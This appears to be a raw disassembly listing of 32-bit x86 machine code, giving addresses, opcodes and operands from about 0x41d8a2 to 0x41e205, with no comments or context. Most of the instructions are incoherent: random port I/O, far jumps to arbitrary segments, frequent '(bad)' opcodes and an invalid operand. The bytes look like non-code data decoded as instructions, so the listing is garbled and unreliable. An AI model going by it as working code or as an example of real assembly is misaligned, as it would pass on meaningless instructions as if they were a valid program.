  41d8a2:	test   eax,0xc5e9a15b
  41d8a7:	dec    esp
  41d8a8:	or     DWORD PTR [edx-0x60],ebp
  41d8ab:	push   ebx
  41d8ac:	add    eax,0x4603a862
  41d8b1:	dec    esi
  41d8b2:	add    eax,0xee1e03b2
  41d8b7:	xabort 0xff
  41d8ba:	mov    ah,0x99
  41d8bc:	lea    edi,[ebx+0x3d]
  41d8bf:	mov    dl,0xcb
  41d8c1:	out    dx,eax
  41d8c2:	shr    BYTE PTR [esp+ebx*1+0x29],cl
  41d8c6:	cmp    DWORD PTR [eax],edi
  41d8c8:	mov    BYTE PTR [esi+0x538e03bc],0x15
  41d8cf:	xor    dh,BYTE PTR [ebx+0x2c3c72fb]
  41d8d5:	sub    ecx,edi
  41d8d7:	std    
  41d8d8:	jo     0x41d8b1
  41d8da:	stos   DWORD PTR es:[edi],eax
  41d8db:	js     0x41d870
  41d8dd:	xlat   BYTE PTR ds:[ebx]
  41d8de:	fimul  WORD PTR [esi+0x13]
  41d8e1:	cmp    edi,eax
  41d8e3:	sahf   
  41d8e4:	pop    es
  41d8e5:	mov    DWORD PTR [esp+edi*8],edi
  41d8e8:	xchg   DWORD PTR [ebx-0x3f],ecx
  41d8eb:	stc    
  41d8ec:	push   es
  41d8ed:	mov    DWORD PTR [eax+eax*2],ebp
  41d8f0:	mov    BYTE PTR [ebx-0x2f],dl
	...
  41d90b:	add    BYTE PTR [eax-0x65],dh
  41d90e:	sbb    ebp,ecx
  41d910:	dec    edx
  41d911:	rol    BYTE PTR [ecx],cl
  41d913:	cmp    al,0xf1
  41d915:	mov    ecx,DWORD PTR [ebp-0x19]
  41d918:	xor    BYTE PTR [edi+ecx*1+0x13b44cf6],dh
  41d91f:	test   al,0xda
  41d921:	add    bh,BYTE PTR [ecx]
  41d923:	mov    ds:0xe9cb909d,eax
  41d928:	test   DWORD PTR [edi*8+0x7b853c2c],0x738df7dd
  41d933:	in     eax,0x4a
  41d935:	cld    
  41d936:	mov    BYTE PTR [eax+eiz*1],bl
  41d939:	lea    ecx,[esi+ebx*1]
  41d93c:	jmp    0xfed8:0x7c71f9cb
  41d943:	pusha  
  41d944:	pushf  
  41d945:	fadd   DWORD PTR [ecx]
  41d947:	arpl   WORD PTR [ebx-0x7eff77e4],cx
  41d94d:	adc    al,0x0
  41d94f:	sbb    DWORD PTR [edx],0x5
  41d952:	mov    cl,BYTE PTR [ebp+0x1]
  41d955:	leave  
  41d956:	fadd   QWORD PTR [edi+edx*1]
  41d959:	fild   DWORD PTR [edi+0x48a14a0c]
  41d95f:	call   0xe201b567
  41d964:	or     DWORD PTR [esi-0x1ee800b2],edx
  41d96a:	(bad)  
  41d96b:	xlat   BYTE PTR ds:[ebx]
  41d96c:	test   DWORD PTR [esp+esi*1+0x1],ebx
	...
  41d988:	add    BYTE PTR [esi-0x7f76fe3b],cl
  41d98e:	test   DWORD PTR [ebp+eax*2-0x2ba7641b],0x4378c816
  41d999:	dec    di
  41d99b:	in     eax,0x8b
  41d99d:	adc    ch,ch
  41d99f:	(bad)  
  41d9a0:	rcl    BYTE PTR [edi+ecx*2-0x2b],1
  41d9a4:	mov    ebp,eax
  41d9a6:	in     al,0x84
  41d9a8:	push   ebp
  41d9a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9aa:	add    DWORD PTR [edx],ebx
  41d9ac:	mov    edx,DWORD PTR [eax]
  41d9ae:	in     eax,dx
  41d9af:	out    0x15,al
  41d9b1:	push   ds
  41d9b2:	addr16 cmc 
  41d9b4:	dec    DWORD PTR [ecx]
  41d9b6:	cmc    
  41d9b7:	xchg   BYTE PTR [ebp-0x7b],dl
  41d9ba:	mov    eax,ds:0x47161870
  41d9bf:	add    eax,0x339b4c03
  41d9c4:	xchg   ebx,eax
  41d9c5:	fsubr  QWORD PTR [edi]
  41d9c7:	dec    edx
  41d9c8:	fadd   DWORD PTR [ecx-0x62b2791c]
  41d9ce:	in     eax,dx
  41d9cf:	inc    eax
  41d9d0:	clc    
  41d9d1:	pop    esp
  41d9d2:	push   edi
  41d9d3:	in     eax,0x8b
  41d9d5:	mov    al,ds:0x294d36ea
  41d9da:	data16 int 0xff
  41d9dd:	hlt    
  41d9de:	jo     0x41da05
  41d9e0:	mov    ecx,eax
  41d9e2:	sbb    ebp,edx
  41d9e4:	dec    edx
  41d9e5:	dec    eax
  41d9e6:	pop    ss
  41d9e7:	jne    0x41d96b
  41d9e9:	inc    edx
  41d9ea:	fbld   TBYTE PTR [edi]
  41d9ec:	xor    DWORD PTR [eax],eax
	...
  41da06:	es sub eax,0xcd35e3b6
  41da0c:	add    bh,bh
  41da0e:	mov    eax,0xb938c10b
  41da13:	pop    ss
  41da14:	clc    
  41da15:	mov    edi,DWORD PTR [ebx+0x7ffd27f5]
  41da1b:	imul   esi,ebp,0x78e7b989
  41da21:	or     BYTE PTR [edi-0x19],ch
  41da24:	(bad)  
  41da25:	pop    ebp
  41da26:	lahf   
  41da27:	in     al,0x42
  41da29:	sbb    ah,dh
  41da2b:	pop    edx
  41da2c:	inc    ecx
  41da2d:	jmp    0xecbabb13
  41da32:	ja     0x41da83
  41da34:	aam    0x88
  41da36:	sub    DWORD PTR [edx+edi*2],esp
  41da39:	inc    edi
  41da3a:	lock aad 0xcc
  41da3d:	xchg   BYTE PTR [ecx],bh
  41da3f:	pop    esp
  41da40:	jns    0x41da8d
  41da42:	in     al,0x92
  41da44:	sub    DWORD PTR [ecx-0x37fdd7df],ecx
  41da4a:	not    DWORD PTR [ecx-0xf]
  41da4d:	cmc    
  41da4e:	mov    dl,0xf0
  41da50:	and    eax,0x24e8ba00
  41da55:	add    BYTE PTR [ebp-0x18],ch
  41da58:	jae    0x41d9e1
  41da5a:	adc    DWORD PTR [ebx+edi*2+0x43],ebp
  41da5e:	pushf  
  41da5f:	inc    edx
  41da60:	inc    esp
  41da61:	or     eax,0x38671
  41da66:	hlt    
  41da67:	inc    edx
  41da68:	cmp    DWORD PTR [edi+0x0],eax
	...
  41da82:	add    cl,al
  41da84:	arpl   WORD PTR [ecx],bx
  41da86:	add    DWORD PTR [edi+0x4],edi
  41da89:	mov    esp,0x26c76cf7
  41da8e:	jge    0x41da57
  41da90:	xor    BYTE PTR [edx],dl
  41da92:	push   esp
  41da93:	add    DWORD PTR [eax+0x4f40592],edx
  41da99:	adc    al,BYTE PTR [edx+0x7b]
  41da9c:	(bad)  
  41da9d:	sub    bl,BYTE PTR [ebx]
  41da9f:	cmc    
  41daa0:	mov    DWORD PTR [edi+esi*1+0x7c8ff49e],ebp
  41daa7:	mov    edi,0x2bb97018
  41daac:	fldenv [edi]
  41daae:	test   eax,0x2fac8bf4
  41dab3:	jge    0x41da7c
  41dab5:	push   ds
  41dab6:	jmp    0x41db02
  41dab8:	lahf   
  41dab9:	jmp    0xfe5e923a
  41dabe:	mov    al,0x3
  41dac0:	or     eax,0x1cdbb93e
  41dac5:	je     0x41daf6
  41dac7:	stc    
  41dac8:	push   ebx
  41dac9:	cmp    al,0x18
  41dacb:	loope  0x41da5f
  41dacd:	(bad)  
  41dace:	jp     0x41db2f
  41dad0:	or     eax,0x1cc824bf
  41dad5:	into   
  41dad6:	jp     0x41db0f
  41dad8:	sbb    eax,0x113756f6
  41dadd:	push   0xffffffa0
  41dadf:	mov    ds:0xcfa06a05,eax
  41dae4:	add    eax,0xa06a
	...
  41dafd:	add    BYTE PTR [eax],al
  41daff:	add    bl,cl
  41db01:	add    eax,0x597a06a
  41db06:	jb     0x41dad8
  41db08:	mov    ecx,DWORD PTR [edx+0x433a05d3]
  41db0e:	out    0x3,al
  41db10:	jae    0x41daa4
  41db12:	ds jl  0x41db4c
  41db15:	push   ecx
  41db16:	jo     0x41dad8
  41db18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db19:	inc    ebx
  41db1a:	add    BYTE PTR [eax+ecx*8],ch
  41db1d:	sbb    eax,ebx
  41db1f:	and    al,0x7
  41db21:	sbb    al,0x84
  41db23:	sub    DWORD PTR [ecx+0x17dc80ca],ebx
  41db29:	add    eax,0x6ceec73
  41db2e:	xchg   DWORD PTR [edi+edi*4+0x3502028d],esp
  41db35:	xor    al,0x73
  41db37:	in     al,0x12
  41db39:	enter  0x42df,0x4
  41db3d:	xchg   BYTE PTR [ebx+0x45],bh
  41db40:	not    DWORD PTR [edi-0xacbd0fc]
  41db46:	jmp    FWORD PTR [edi+0x34]
  41db49:	inc    eax
  41db4a:	cmp    DWORD PTR [ebx+edi*4+0x340e0e97],ebp
  41db51:	sub    ch,bh
  41db53:	mov    ah,0xb3
  41db55:	test   edx,eax
  41db57:	in     eax,0x76
  41db59:	mov    al,ds:0x439ae9d3
  41db5e:	jmp    0xd00a0548
  41db63:	jmp    0x41db68
	...
  41db7c:	add    BYTE PTR [eax+ecx*8-0x1d],bl
  41db80:	and    BYTE PTR [ebx+0x4ce1763b],bl
  41db86:	enter  0x62d7,0x83
  41db8a:	aas    
  41db8b:	jmp    0xdc0a187f
  41db90:	jb     0x41db15
  41db92:	xor    eax,DWORD PTR [eax+0x7404da34]
  41db98:	in     al,0x9c
  41db9a:	mov    bl,0x1d
  41db9d:	mov    edi,0x1feb0c9b
  41dba2:	add    DWORD PTR [esi],ebx
  41dba4:	bound  ebp,QWORD PTR [eax]
  41dba6:	pop    esp
  41dba7:	jmp    0x8c00:0x1db10fe1
  41dbae:	pushf  
  41dbaf:	iret   
  41dbb0:	shl    DWORD PTR [edi-0x10],0x84
  41dbb4:	inc    ebp
  41dbb5:	mov    eax,ds:0xd518e7c7
  41dbba:	xor    al,0x1b
  41dbbc:	add    ah,ch
  41dbbe:	inc    esp
  41dbbf:	sbb    eax,DWORD PTR [ebx]
  41dbc1:	adc    ebx,DWORD PTR [ebx+edi*8+0x1]
  41dbc5:	(bad)  
  41dbc7:	add    eax,DWORD PTR [eax+0xefff438]
  41dbcd:	shl    BYTE PTR [esi-0x78b20001],1
  41dbd3:	or     ecx,DWORD PTR [eax]
  41dbd5:	popf   
  41dbd6:	arpl   bp,cx
  41dbd8:	add    BYTE PTR [edi-0x72c88ee7],dl
  41dbde:	arpl   sp,di
	...
  41dbf8:	add    BYTE PTR [eax],al
  41dbfa:	sbb    DWORD PTR [edx],0x54a94d38
  41dc00:	xor    DWORD PTR [ecx+edx*1],ecx
  41dc03:	lahf   
  41dc04:	add    cl,BYTE PTR [eax-0x3e78fef7]
  41dc0a:	int3   
  41dc0b:	clc    
  41dc0c:	pop    es
  41dc0d:	mov    BYTE PTR [ecx+0x1c8afd00],ah
  41dc13:	(bad)  
  41dc14:	out    0x10,eax
  41dc16:	fs push ebx
  41dc18:	mov    ecx,0x880ec4c1
  41dc1d:	inc    esp
  41dc1e:	retf   
  41dc1f:	add    al,0x88
  41dc21:	dec    esp
  41dc22:	fild   DWORD PTR ds:0x7ba45c6
  41dc28:	jg     0x41dbf0
  41dc2a:	sar    ebp,1
  41dc2c:	pop    es
  41dc2d:	or     al,0xcd
  41dc2f:	fadd   DWORD PTR [eax-0x1]
  41dc32:	popf   
  41dc33:	sahf   
  41dc34:	add    bh,bh
  41dc36:	add    BYTE PTR [ecx-0x1e64fb78],dh
  41dc3c:	jo     0x41dc02
  41dc3e:	hlt    
  41dc3f:	jb     0x41dbef
  41dc41:	test   DWORD PTR [ebx-0x7cafd00f],0x11e83119
  41dc4b:	cwde   
  41dc4c:	and    edi,ebp
  41dc4e:	neg    DWORD PTR [ebx+0x55e1c07d]
  41dc54:	and    al,0x73
  41dc56:	pop    esp
  41dc57:	adc    ebp,DWORD PTR [ebx+ecx*2+0x4c]
  41dc5b:	mov    ebx,0xf3ad
	...
  41dc74:	add    BYTE PTR [eax],al
  41dc76:	add    BYTE PTR [ebx],al
  41dc78:	jnp    0x41dc48
  41dc7a:	jmp    0x41dcc7
  41dc7c:	xor    DWORD PTR [ecx],esi
  41dc7e:	mov    ecx,ecx
  41dc80:	cmp    DWORD PTR [ebx],0x5
  41dc83:	cmc    
  41dc84:	xchg   esi,eax
  41dc85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc86:	pop    es
  41dc87:	jl     0x41dcf2
  41dc89:	and    ecx,DWORD PTR [eax-0x73e7154f]
  41dc8f:	daa    
  41dc90:	jecxz  0x41dcb5
  41dc92:	mov    DWORD PTR [ecx-0x91fbe51],esi
  41dc98:	pop    ebx
  41dc99:	and    al,0x73
  41dc9b:	add    al,0xb9
  41dc9d:	hlt    
  41dc9e:	sbb    eax,0x6daf3a5
  41dca3:	cmc    
  41dca4:	sub    eax,DWORD PTR [eax]
  41dca6:	lock ja 0x41dd11
  41dca9:	adc    eax,0x15607f10
  41dcae:	adc    DWORD PTR [ecx+0x50],0x6c3138f4
  41dcb5:	adc    DWORD PTR [eax+eax*2+0x77fd2132],ecx
  41dcbc:	loopne 0x41dce9
  41dcbe:	adc    BYTE PTR [edi-0x18],ch
  41dcc1:	sub    eax,DWORD PTR [ecx+0x38f45449]
  41dcc7:	cmp    DWORD PTR [eax+edx*1+0x2169d48c],ebx
  41dcce:	std    
  41dccf:	inc    ebx
  41dcd0:	add    eax,0x4c3a4a72
  41dcd5:	test   eax,0x61aff410
  41dcda:	xor    BYTE PTR [eax],al
	...
  41dcf4:	jge    0x41dcb5
  41dcf6:	fcmovu st,st(6)
  41dcf8:	ss cmc 
  41dcfa:	cmc    
  41dcfb:	mov    ah,BYTE PTR [esp+eax*1-0x19]
  41dcff:	add    eax,ebp
  41dd01:	mov    dl,0x61
  41dd03:	fwait
  41dd04:	pop    es
  41dd05:	push   es
  41dd06:	hlt    
  41dd07:	(bad)  
  41dd09:	ds and cl,al
  41dd0c:	pop    es
  41dd0d:	xchg   ebx,eax
  41dd0e:	push   es
  41dd0f:	(bad)  
  41dd10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd11:	or     al,0x64
  41dd13:	or     BYTE PTR ds:0x4c4b61b5,al
  41dd19:	cmp    DWORD PTR es:[ebx],esp
  41dd1c:	cmp    DWORD PTR [ecx],ecx
  41dd1e:	jne    0x41dceb
  41dd20:	repnz add ebp,DWORD PTR [ebx+ecx*1-0x2c59ad07]
  41dd28:	hlt    
  41dd29:	cmp    al,0xe2
  41dd2b:	rol    BYTE PTR [edi],0x97
  41dd2e:	push   es
  41dd2f:	(bad)  
  41dd30:	mov    ecx,0xe7b961fc
  41dd35:	mov    gs,WORD PTR [esi-0xd400b3c]
  41dd3b:	push   es
  41dd3c:	and    cl,BYTE PTR [ebp+0x6ed842d]
  41dd42:	jl     0x41dd37
  41dd44:	sub    al,0x13
  41dd46:	jp     0x41dd1f
  41dd48:	ins    DWORD PTR es:[edi],dx
  41dd49:	(bad)  
  41dd4a:	outs   dx,BYTE PTR ds:[esi]
  41dd4b:	sti    
  41dd4c:	sbb    eax,esi
  41dd4e:	and    DWORD PTR [esi+0x46],ecx
  41dd51:	cmpps  xmm5,xmm3,0x4b
  41dd55:	sbb    al,0xe9
  41dd57:	cwde   
	...
  41dd70:	add    bl,dh
  41dd72:	fstp   TBYTE PTR [eax-0x1f75276a]
  41dd78:	mov    ecx,DWORD PTR [eax*8+0x4ecb27ff]
  41dd7f:	jb     0x41dd38
  41dd81:	shl    ch,cl
  41dd83:	jg     0x41dd27
  41dd85:	repz xchg ebx,eax
  41dd87:	or     eax,0x995e9e2
  41dd8c:	arpl   WORD PTR [eax-0x46d6e780],cx
  41dd92:	(bad)  
  41dd94:	sti    
  41dd95:	fisttp QWORD PTR [ebp-0x3e0512bd]
  41dd9b:	or     esp,DWORD PTR [eax+0x3c]
  41dd9e:	or     al,0x39
  41dda0:	and    al,0x68
  41dda2:	or     DWORD PTR [esi-0x2e5e923],eax
  41dda8:	mov    edi,0x25187792
  41ddad:	xor    bl,BYTE PTR [eax]
  41ddaf:	pop    esp
  41ddb0:	sub    eax,DWORD PTR [edi+0x18]
  41ddb3:	push   esp
  41ddb4:	jb     0x41ddc1
  41ddb6:	mov    cs,WORD PTR [ebx-0x13]
  41ddb9:	push   es
  41ddba:	push   edx
  41ddbb:	dec    edi
  41ddbc:	in     al,dx
  41ddbd:	jb     0x41dde8
  41ddbf:	inc    esp
  41ddc0:	call   0x1d6a:0xbed8d55d
  41ddc7:	data16 loop 0x41dd94
  41ddca:	or     DWORD PTR [edi+ecx*8-0x21fffb0e],eax
  41ddd1:	sahf   
  41ddd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddd3:	add    al,0x8f
	...
  41dded:	add    BYTE PTR [edx],bl
  41ddef:	adc    eax,0x4f0650d
  41ddf4:	add    cl,ch
  41ddf6:	push   es
  41ddf7:	push   edx
  41ddf8:	aas    
  41ddf9:	call   0x9e4f12f8
  41ddfe:	and    al,BYTE PTR [eax-0x73614ead]
  41de04:	dec    edi
  41de05:	jmp    0x331c:0xded6049d
  41de0c:	xchg   DWORD PTR [eax],eax
  41de0e:	fmul   st,st(4)
  41de10:	test   BYTE PTR [ebp-0x6f],bl
  41de13:	mov    ebx,DWORD PTR [ecx-0x14]
  41de16:	adc    al,0x58
  41de18:	leave  
  41de19:	mov    edi,DWORD PTR [ebp-0x77]
  41de1c:	inc    ecx
  41de1d:	enter  0xc1c6,0xa
  41de21:	mov    bh,0x5d
  41de23:	pop    bp
  41de25:	pop    esi
  41de26:	adc    al,0x50
  41de28:	frstor [esi-0x5a]
  41de2b:	rep outs dx,BYTE PTR ds:[esi]
  41de2d:	add    eax,0xebed7004
  41de32:	pop    ebx
  41de33:	hlt    
  41de34:	mov    dl,0xc0
  41de36:	aam    0x3f
  41de38:	in     eax,dx
  41de39:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de3b:	dec    esi
  41de3c:	lds    ecx,FWORD PTR [edi]
  41de3e:	into   
  41de3f:	gs (bad) 
  41de41:	call   FWORD PTR [ebp+0x6d]
  41de44:	cmp    BYTE PTR [ebp-0x53],0x0
  41de48:	or     eax,DWORD PTR [ecx+ebp*1+0x42000001]
  41de4f:	mov    esp,0xf050
	...
  41de68:	add    BYTE PTR [eax],al
  41de6a:	add    BYTE PTR [edx],ah
  41de6c:	mov    ebp,0x94123042
  41de71:	ror    DWORD PTR [ecx-0x48f514a8],0x4c
  41de78:	add    BYTE PTR [ebp+0x418bc955],al
  41de7e:	in     al,0x96
  41de80:	aas    
  41de81:	ror    DWORD PTR [ebx-0x39d92098],0x2
  41de88:	mov    esp,0x587d6abf
  41de8d:	arpl   WORD PTR [ebx],di
  41de8f:	or     eax,0x88890270
  41de94:	out    dx,al
  41de95:	out    0x6,al
  41de97:	loop   0x41de56
  41de99:	mov    edi,0x65fd1889
  41de9e:	cmp    esi,esp
  41dea0:	mov    eax,0x5770d47
  41dea5:	push   es
  41dea6:	add    ah,dh
  41dea8:	lds    eax,FWORD PTR [edx+0x102ca87b]
  41deae:	test   BYTE PTR [edx],cl
  41deb0:	sub    al,BYTE PTR [ecx]
  41deb2:	add    bl,dh
  41deb4:	mov    ?,WORD PTR [ebp-0x3849140d]
  41deba:	pop    es
  41debb:	add    ebp,DWORD PTR [edi-0x6bcf2b2]
  41dec1:	and    ecx,DWORD PTR [ebx+0xd201d20]
  41dec7:	dec    ebx
  41dec8:	adc    BYTE PTR fs:[ebp-0x86a6acb],ch
	...
  41dee7:	add    bl,bh
  41dee9:	aad    0x97
  41deeb:	das    
  41deec:	mul    eax
  41deee:	sbb    eax,DWORD PTR [ecx]
  41def0:	mov    ecx,0x3aad0fa3
  41def5:	xchg   ebp,eax
  41def6:	int    0xcf
  41def8:	sti    
  41def9:	jle    0x41df3a
  41defb:	mov    DWORD PTR [ecx-0xbc87ec9],esi
  41df01:	xchg   esp,eax
  41df02:	mov    ch,0xd7
  41df04:	jge    0x41df67
  41df06:	pop    ebp
  41df07:	or     eax,0xf970
  41df0c:	hlt    
  41df0d:	mov    eax,ds:0xe5742fcf
  41df12:	add    DWORD PTR [ebx-0x2d],esi
  41df15:	xchg   edx,eax
  41df16:	adc    BYTE PTR [ecx],bh
  41df18:	aaa    
  41df19:	pop    ds
  41df1a:	mov    BYTE PTR [edx-0x76fed40b],bh
  41df20:	mov    bl,0x23
  41df22:	mov    WORD PTR [ebx-0x24],cs
  41df25:	sub    al,BYTE PTR [edi+0x1]
  41df28:	mov    esp,0x1fbfcda4
  41df2d:	in     eax,dx
  41df2e:	xchg   ebx,eax
  41df2f:	pop    ss
  41df30:	outs   dx,DWORD PTR ds:[esi]
  41df31:	add    al,0x36
  41df33:	clc    
  41df34:	sbb    al,0x4d
  41df36:	jmp    0xf3d9:0xe7f07e4d
  41df3d:	add    eax,0x4f46464
  41df42:	out    0xc3,eax
  41df44:	in     al,dx
  41df45:	mov    edi,0x19892a6
  41df4a:	adc    BYTE PTR ds:[eax],al
	...
  41df65:	fst    QWORD PTR [ecx]
  41df67:	xor    eax,0xe87f9334
  41df6c:	add    esi,esp
  41df6e:	test   BYTE PTR [eax+0x61c40702],ah
  41df74:	dec    esp
  41df75:	mov    ebp,0x286de41
  41df7a:	add    al,0xe7
  41df7c:	add    edi,DWORD PTR [ebp-0x43]
  41df7f:	fimul  WORD PTR [edx+0x44ea2cc7]
  41df85:	cmc    
  41df86:	xor    al,0xb2
  41df88:	inc    ecx
  41df89:	in     eax,0xf7
  41df8b:	jno    0x41df24
  41df8d:	out    0xe9,eax
  41df8f:	push   esi
  41df90:	add    ebx,DWORD PTR [ebx-0x75]
  41df93:	fadd   QWORD PTR [ebx+0x6d]
  41df96:	(bad)  
  41df97:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41df99:	ins    BYTE PTR es:[edi],dx
  41df9a:	shr    ah,1
  41df9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df9d:	in     al,dx
  41df9e:	aam    0xb3
  41dfa0:	mov    edx,0xdae94474
  41dfa5:	xor    eax,0xa9033b92
  41dfaa:	or     dl,ah
  41dfac:	dec    edx
  41dfad:	mov    al,BYTE PTR [esi+0x10]
  41dfb0:	fisttp WORD PTR [edx]
  41dfb2:	adc    eax,0xb83e7
  41dfb7:	fimul  WORD PTR [eax+0x3e703c2]
  41dfbd:	jge    0x41dffc
  41dfbf:	ret    0xf942
  41dfc2:	mov    eax,DWORD PTR [eax]
  41dfc4:	(bad)  
  41dfc7:	add    BYTE PTR [edx+0x0],ah
	...
  41dfe2:	mov    bl,0xfc
  41dfe4:	mov    BYTE PTR [eax+eiz*1],bh
  41dfe7:	push   es
  41dfe8:	mov    edi,0xc1ce07ea
  41dfed:	pop    edx
  41dfee:	mov    edi,0xcef5757d
  41dff3:	and    al,0x1
  41dff5:	mov    eax,0x72bf9880
  41dffa:	mov    WORD PTR [ecx+ecx*4-0x3],ss
  41dffe:	stc    
  41dfff:	int    0x2f
  41e001:	xor    al,0xa7
  41e003:	test   eax,eax
  41e005:	in     eax,dx
  41e006:	scas   al,BYTE PTR es:[edi]
  41e007:	inc    esi
  41e008:	jb     0x41df98
  41e00a:	test   cl,0xb
  41e00d:	shr    BYTE PTR [esi],cl
  41e00f:	fwait
  41e010:	iret   
  41e011:	and    dl,0x4
  41e014:	add    cl,ch
  41e016:	add    bl,BYTE PTR [ebx+0x45]
  41e019:	sub    BYTE PTR [ecx-0x832ffac],bl
  41e01f:	add    al,0x81
  41e021:	out    dx,al
  41e022:	sub    eax,DWORD PTR [edi]
  41e024:	je     0x41e019
  41e026:	clc    
  41e027:	(bad)  
  41e028:	sti    
  41e029:	mov    cl,BYTE PTR [edi+0x40]
  41e02c:	inc    ecx
  41e02d:	jmp    0x9ccadf40
  41e032:	fstp   TBYTE PTR [edi+0x44]
  41e035:	call   0x3d856b82
  41e03a:	jle    0x41e004
  41e03c:	jmp    0x41e0a0
  41e03e:	inc    esp
  41e03f:	adc    BYTE PTR [ebx-0x74ff0f63],cl
  41e045:	pushf  
	...
  41e05e:	add    bl,dl
  41e060:	sbb    al,0x36
  41e062:	in     al,0xf0
  41e064:	add    al,0x84
  41e066:	sub    edx,esi
  41e068:	mov    BYTE PTR [edi-0x76fb0817],dh
  41e06e:	add    BYTE PTR [eax+0x944fee3],ah
  41e074:	push   0xffffff88
  41e076:	push   ebp
  41e077:	in     eax,dx
  41e078:	imul   edi,DWORD PTR [esi-0x79962a3e],0x517e4310
  41e082:	in     al,0x33
  41e084:	enter  0x8c1,0x33
  41e088:	adc    BYTE PTR [eax+0x2],0x33
  41e08c:	jle    0x41e0df
  41e08e:	lock inc ebx
  41e090:	enter  0x8c1,0x33
  41e094:	adc    BYTE PTR [eax+0x4],0x33
  41e098:	jle    0x41e0eb
  41e09a:	hlt    
  41e09b:	xor    ecx,eax
  41e09d:	ror    DWORD PTR [eax],0x3
  41e0a0:	adc    BYTE PTR [eax+0x6],0x6
  41e0a4:	pop    edx
  41e0a5:	dec    ebp
  41e0a6:	mov    DWORD PTR [ebp-0x26808100],edi
  41e0ac:	or     ecx,DWORD PTR [ecx+0xc7b6948]
  41e0b2:	jmp    DWORD PTR [eax-0x21]
  41e0b5:	dec    esi
  41e0b6:	jmp    DWORD PTR [eax-0x4d]
  41e0b9:	dec    esp
  41e0ba:	call   0x3cc531
  41e0bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0c0:	push   esi
  41e0c1:	or     al,0xb6
	...
  41e0db:	add    BYTE PTR [edx-0x1a8bbaba],dl
  41e0e1:	inc    eax
  41e0e2:	jno    0x41e104
  41e0e4:	xchg   ebp,eax
  41e0e5:	aas    
  41e0e6:	jno    0x41e0ee
  41e0e8:	sahf   
  41e0e9:	imul   edi,ecx,0x0
  41e0ec:	(bad)  
  41e0ed:	push   esi
  41e0ee:	cld    
  41e0ef:	jne    0x41e0f6
  41e0f1:	jle    0x41e144
  41e0f3:	aam    0xca
  41e0f5:	jnp    0x41e0ec
  41e0f7:	mov    esp,DWORD PTR [eax-0x29]
  41e0fa:	push   edx
  41e0fb:	mov    esi,DWORD PTR [eax+eiz*8-0x50b056b]
  41e102:	sbb    ch,cl
  41e104:	int3   
  41e105:	add    dl,BYTE PTR [ebp+0x35717fd7]
  41e10b:	std    
  41e10c:	popa   
  41e10d:	add    al,0x87
  41e10f:	inc    ebx
  41e110:	les    ebp,FWORD PTR [ebp-0x4c]
  41e113:	out    0x62,eax
  41e115:	sbb    bl,BYTE PTR [edi*8+0x731c0fdf]
  41e11c:	lods   al,BYTE PTR ds:[esi]
  41e11d:	xchg   edi,eax
  41e11e:	mov    ch,0xd3
  41e120:	ret    
  41e121:	mov    cl,0x1b
  41e123:	mov    DWORD PTR [ecx],esi
  41e125:	dec    esp
  41e126:	mov    dl,0x54
  41e128:	pushf  
  41e129:	mov    ds:0x95abfd0e,al
  41e12e:	(bad)  
  41e131:	pop    esp
  41e132:	xchg   ebp,eax
  41e133:	or     ch,BYTE PTR [edi-0xf]
  41e136:	das    
  41e137:	std    
  41e138:	cmp    DWORD PTR [eax-0x72],ebx
  41e13b:	inc    esp
  41e13c:	cmc    
  41e13d:	pop    ds
  41e13e:	mov    al,BYTE PTR [ebx+0x0]
	...
  41e159:	nop
  41e15a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e15b:	(bad)
  41e15e:	call   0x18036a8a
  41e163:	mov    BYTE PTR [ebx+0x38],bl
  41e166:	jne    0x41e1d4
  41e168:	sti    
  41e169:	arpl   WORD PTR [ebx+0x1f545387],bx
  41e16f:	mov    dh,0xef
  41e171:	pop    ebp
  41e172:	inc    ebp
  41e173:	push   ds
  41e174:	std    
  41e175:	dec    ebx
  41e176:	test   eax,0x45f97337
  41e17b:	call   FWORD PTR [ebp+0x4f]
  41e17e:	cmc    
  41e17f:	into   
  41e180:	mov    edi,0xbc5949a
  41e185:	sahf   
  41e186:	daa    
  41e187:	mov    es,WORD PTR [ebx-0x10]
  41e18a:	imul   ebx,DWORD PTR [ebx+esi*2],0xffffffec
  41e18e:	dec    ecx
  41e18f:	inc    edx
  41e190:	sar    esp,0x4
  41e193:	lea    ecx,[edx-0x42f0fd51]
  41e199:	push   0x34871612
  41e19e:	cdq    
  41e19f:	cmc    
  41e1a0:	sbb    al,0x67
  41e1a2:	and    DWORD PTR [esi],eax
  41e1a4:	xchg   esi,eax
  41e1a5:	iret   
  41e1a6:	adc    DWORD PTR [ebx+ecx*1-0x34],esi
  41e1aa:	rcr    BYTE PTR [ebp+0x1c],0xd9
  41e1ae:	mov    BYTE PTR [edi],ah
  41e1b0:	xchg   edi,eax
  41e1b1:	not    ch
  41e1b3:	fadd   st(2),st
  41e1b5:	fadd   QWORD PTR [esi]
  41e1b7:	sbb    dl,BYTE PTR [edx]
  41e1b9:	rcl    DWORD PTR [edi+0x2cb2],0x0
	...
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	stos   DWORD PTR es:[edi],eax
  41e1d7:	or     al,ch
  41e1d9:	add    edi,DWORD PTR [ebp+0x4a]
  41e1dc:	rol    BYTE PTR [esi],cl
  41e1de:	in     eax,0x44
  41e1e0:	push   ds
  41e1e1:	mov    edx,0xca93c3c
  41e1e6:	hlt    
  41e1e7:	(bad)  
  41e1e8:	lahf   
  41e1e9:	das    
  41e1ea:	clc    
  41e1eb:	xor    ecx,DWORD PTR [edi-0x17a3b4e6]
  41e1f1:	(bad)  
  41e1f2:	mov    edi,DWORD PTR [ebp+0x3b]
  41e1f5:	loopne 0x41e1ee
  41e1f7:	stos   BYTE PTR es:[edi],al
  41e1f8:	pop    edi
  41e1f9:	push   es
  41e1fa:	jge    0x41e1c4
  41e1fc:	retf   0x7c0b
  41e1ff:	cld    
  41e200:	test   al,0xc
  41e202:	hlt    
  41e203:	mov    bh,0x61
  41e205:	sub    BYTE PTR [ebp+0x20],dh
